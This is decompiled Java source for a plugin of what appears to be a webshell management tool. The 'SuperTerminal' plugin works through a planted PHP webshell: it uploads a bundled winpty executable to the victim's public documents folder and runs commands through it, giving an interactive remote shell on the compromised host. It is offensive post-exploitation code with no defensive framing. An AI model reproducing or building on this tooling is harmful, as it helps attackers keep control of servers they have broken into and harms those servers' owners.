/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.php;

import core.EasyI18N;
import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import shells.plugins.generic.RealCmd;
import shells.plugins.generic.SuperTerminal;
import util.Log;
import util.functions;

@PluginAnnotation(payloadName="PhpDynamicPayload", Name="SuperTerminal", DisplayName="\u8d85\u7ea7\u7ec8\u7aef")
public class PSuperTerminal
extends SuperTerminal {
    @Override
    public RealCmd getRealCmd() {
        RealCmd plugin = (RealCmd)this.shellEntity.getFrame().getPlugin("RealCmd");
        if (plugin != null) {
            return plugin;
        }
        GOptionPane.showMessageDialog(super.getView(), "\u672a\u627e\u5230HttpProxy\u63d2\u4ef6!", "\u63d0\u793a", 0);
        return null;
    }

    @Override
    public boolean winptyInit(String tmpCommand) throws Exception {
        boolean superRet = super.winptyInit(tmpCommand);
        if (superRet) {
            String winptyFileName = String.format("%swinpty-%s.exe", this.getTempDirectory(), "Console-x" + (this.payload.isX64() ? 64 : 32));
            if (this.payload.getFileSize(winptyFileName) <= 0) {
                Log.log(EasyI18N.getI18nString("\u4e0a\u4f20PtyOfConsole remoteFile->%s"), winptyFileName);
                if (this.payload.uploadFile(winptyFileName, functions.readInputStreamAutoClose(SuperTerminal.class.getResourceAsStream(String.format("assets/winptyConsole-x%d.exe", this.payload.isX64() ? 64 : 32))))) {
                    Log.log(EasyI18N.getI18nString("\u4e0a\u4f20PtyOfConsole\u6210\u529f!"), new Object[0]);
                    String[] commands = functions.SplitArgs(tmpCommand);
                    this.realCmdCommand = String.format("%s %s", winptyFileName, commands[1]);
                    Log.log(EasyI18N.getI18nString("WinPty \u6d3e\u751f\u547d\u4ee4->%s"), this.realCmdCommand);
                    return true;
                }
            } else {
                Log.log(EasyI18N.getI18nString("\u5df2\u6709winpty console \u65e0\u9700\u518d\u6b21\u4e0a\u4f20"), new Object[0]);
            }
        }
        return superRet;
    }

    @Override
    protected String getTempDirectory() {
        if (this.payload.isWindows()) {
            return "C:/Users/Public/Documents/";
        }
        return super.getTempDirectory();
    }
}

